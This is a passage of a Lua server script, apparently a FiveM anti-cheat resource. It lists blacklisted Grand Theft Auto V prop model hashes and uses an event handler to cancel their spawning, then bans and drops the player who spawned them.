    GetHashKey("stt_prop_ramp_spiral_m"),
    GetHashKey("stt_prop_ramp_spiral_s"),
    GetHashKey("stt_prop_ramp_spiral_xxl"),
    GetHashKey("stt_prop_stunt_track_dwuturn"),
    GetHashKey("stt_prop_stunt_track_dwslope30"),
    GetHashKey("stt_prop_stunt_track_start"),
    GetHashKey("stt_prop_stunt_track_hill2"),
    GetHashKey("stt_prop_stunt_bblock_huge_01"),
    GetHashKey("stt_prop_stunt_bblock_huge_02"),
    GetHashKey("stt_prop_stunt_bblock_huge_03"),
    GetHashKey("stt_prop_stunt_bblock_huge_04"),
    GetHashKey("stt_prop_stunt_bblock_huge_05"),
    GetHashKey("stt_prop_stunt_bblock_hump_01"),
    GetHashKey("stt_prop_stunt_bblock_hump_02"),
    GetHashKey("stt_prop_stunt_bblock_lrg1"),
    GetHashKey("stt_prop_stunt_bblock_lrg2"),
    GetHashKey("stt_prop_stunt_bblock_lrg3"),
    GetHashKey("stt_prop_stunt_bblock_mdm1"),
    GetHashKey("stt_prop_stunt_bblock_mdm2"),
    GetHashKey("stt_prop_stunt_bblock_mdm3"),
    GetHashKey("stt_prop_stunt_bblock_qp"),
    GetHashKey("stt_prop_stunt_bblock_qp2"),
    GetHashKey("stt_prop_stunt_bblock_qp3"),
    GetHashKey("apa_mp_h_acc_box_trinket_01"),
    GetHashKey("hei_prop_carrier_cargo_02a"),
    GetHashKey("stt_prop_stunt_bowling_ball"),
    GetHashKey("apa_mp_h_acc_rugwoolm_03"),
    GetHashKey("imp_prop_impexp_sofabed_01a"),
    GetHashKey("apa_mp_h_yacht_bed_01"),
    GetHashKey("apa_mp_h_bed_double_08"),
    GetHashKey("prop_ferris_car_01_lod1"),
    GetHashKey("prop_construcionlamp_01"),
    GetHashKey("prop_windmill_01"),
    GetHashKey("p_spinning_anus_s"),
    GetHashKey("prop_container_ld2"),
    GetHashKey("prop_beach_fire"),
    GetHashKey("prop_gas_pump_1a"),
    GetHashKey("prop_gas_pump_1b"),
    GetHashKey("prop_gas_pump_1c"),
    GetHashKey("prop_gas_pump_1d"),
    GetHashKey("prop_gas_pump_old2"),
    GetHashKey("prop_gas_pump_old3"),
    GetHashKey("prop_vintage_pump"),
    GetHashKey("prop_roundbailer02"),
    GetHashKey("prop_roundbailer01"),
    GetHashKey("prop_container_05a"),
    GetHashKey("p_ld_stinger_s"),
    GetHashKey("p_cablecar_s"),
    GetHashKey("p_ferris_car_01"),
    GetHashKey("prop_cj_big_boat"),
    GetHashKey("prop_rock_4_big2"),
    GetHashKey("prop_steps_big_01"),
    GetHashKey("v_ilev_lest_bigscreen"),
    GetHashKey("prop_carcreeper"),
    GetHashKey("apa_mp_h_bed_double_09"),
    GetHashKey("apa_mp_h_bed_wide_05"),
    GetHashKey("prop_cattlecrush"),
    GetHashKey("prop_cs_documents_01"),
    GetHashKey("prop_fncconstruc_01d"),
    GetHashKey("prop_fncconstruc_02a"),
    GetHashKey("p_dock_crane_cabl_s"),
    GetHashKey("prop_dock_crane_01"),
    GetHashKey("prop_dock_crane_02_cab"),
    GetHashKey("prop_dock_float_1"),
    GetHashKey("prop_dock_crane_lift"),
    GetHashKey("csx_seabed_bldr4_"),
    -1404869155,--FIB Build
    -685641702, --unknown
    -759902142, --fire
    2967811882, --city
    566160949, --city
    841438406, --city
    3821613641,--city
    3957771795,--city
}

function inTable(tbl, item)
    for key, value in pairs(tbl) do
        if value == item then return key end
    end
    return false
end

-- Anti Blacklist Object & Vehicles
AddEventHandler("entityCreating", function(entity)
    local owner = GetEntityOwner(entity)
    if DoesEntityExist(entity) then
        if (owner ~= nil and owner > 0) then -- fix nil owner
            local entityModel = GetEntityModel(entity)
            if inTable(entityArray, entityModel) ~= false then
                if entityModel ~= 0 then -- fix nil entity
                    CancelEvent() -- block
                    BanPlayer(owner, "Tried to spawn a blacklisted entity: " .. entityModel)
                    DropPlayer(owner, ":(")  
                end
            end    
        end
    end    
end)
